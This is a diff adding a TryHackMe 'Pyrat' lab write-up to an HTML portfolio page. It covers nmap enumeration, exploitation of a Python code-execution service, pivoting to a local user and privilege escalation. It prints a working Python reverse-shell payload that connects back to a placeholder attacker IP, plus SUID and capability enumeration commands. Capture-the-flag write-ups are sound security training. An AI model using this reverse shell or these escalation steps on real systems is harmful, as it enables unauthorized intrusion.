@@ -374,6 +374,78 @@ stty raw -echo; fg</code></pre>
 
           <article class="card hacking-note-card hacking-feature-card">
             <p class="eyebrow">Featured Resource</p>
+            <h3>Pyrat</h3>
+            <img class="hacking-feature-image" src="assets/pyrat.png" alt="Pyrat room graphic" />
+            <a class="btn" href="https://www.notion.so/Pyrat-231ca0ef4e7a8020ac4ad24f9f6bbb8c?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <details class="hacking-notes">
+              <summary class="btn ghost">Show Me The Notes</summary>
+              <div class="hacking-notes-body">
+                <h4>Pyrat - TryHackMe Write-Up</h4>
+                <p>This room centered on identifying an unusual Python-exposed service, turning that into code execution, pivoting to a local user, and escalating to root.</p>
+
+                <h5>Initial Enumeration</h5>
+                <p>I started with a full Nmap scan:</p>
+                <pre><code>nmap -sVC -p- &lt;TARGET-IP&gt;</code></pre>
+                <p>Enumeration revealed an unusual service that responded when connected to with Netcat:</p>
+                <pre><code>nc &lt;TARGET-IP&gt; &lt;PORT&gt;</code></pre>
+                <p>The service behavior suggested it was vulnerable to Python code execution.</p>
+
+                <h5>Python Code Execution</h5>
+                <p>After testing payloads, I landed on a working Python reverse shell. First I started a listener:</p>
+                <pre><code>nc -lvnp 4444</code></pre>
+                <p>Then I used the reverse shell payload below:</p>
+                <pre><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("&lt;YOUR-IP&gt;",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])</code></pre>
+                <p>This successfully returned a shell.</p>
+
+                <h5>User Enumeration</h5>
+                <p>Once on the box, I enumerated local users:</p>
+                <pre><code>ls /home</code></pre>
+                <p>This revealed the user <code>think</code>. Further enumeration uncovered credentials that could be used to switch users.</p>
+
+                <h5>Switch User</h5>
+                <p>Using the discovered password, I switched into the user account:</p>
+                <pre><code>su think</code></pre>
+                <p>This provided user-level access.</p>
+
+                <h5>Privilege Escalation Enumeration</h5>
+                <p>Next I checked sudo rights and ran standard escalation enumeration:</p>
+                <pre><code>sudo -l</code></pre>
+                <pre><code>find / -perm -4000 2&gt;/dev/null</code></pre>
+                <pre><code>getcap -r / 2&gt;/dev/null</code></pre>
+                <pre><code>linpeas.sh</code></pre>
+                <p>After multiple checks and execution attempts, privilege escalation was achieved.</p>
+
+                <h5>Root Access</h5>
+                <p>Once escalation succeeded, <code>whoami</code> returned:</p>
+                <pre><code>root</code></pre>
+                <p>I then moved into the root directory and captured the flag:</p>
+                <pre><code>cd /root
+ls
+cat root.txt</code></pre>
+
+                <h5>Useful Commands</h5>
+                <pre><code>nmap -sVC -p- &lt;TARGET-IP&gt;
+nc &lt;TARGET-IP&gt; &lt;PORT&gt;
+nc -lvnp 4444
+ls /home
+su think
+find / -perm -4000 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null</code></pre>
+
+                <h5>Final Result</h5>
+                <p>Reverse shell obtained, user access obtained, privilege escalation completed, and the root flag captured successfully.</p>
+              </div>
+            </details>
+          </article>
+
+          <article class="card hacking-note-card hacking-feature-card">
+            <p class="eyebrow">Featured Resource</p>
             <h3>Lian_Yu</h3>
             <img class="hacking-feature-image" src="assets/lian-yu.jpeg" alt="Lian Yu island graphic" />
             <a class="btn" href="https://www.notion.so/Lian_Yu-33cca0ef4e7a808a93c8f6e564908947?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
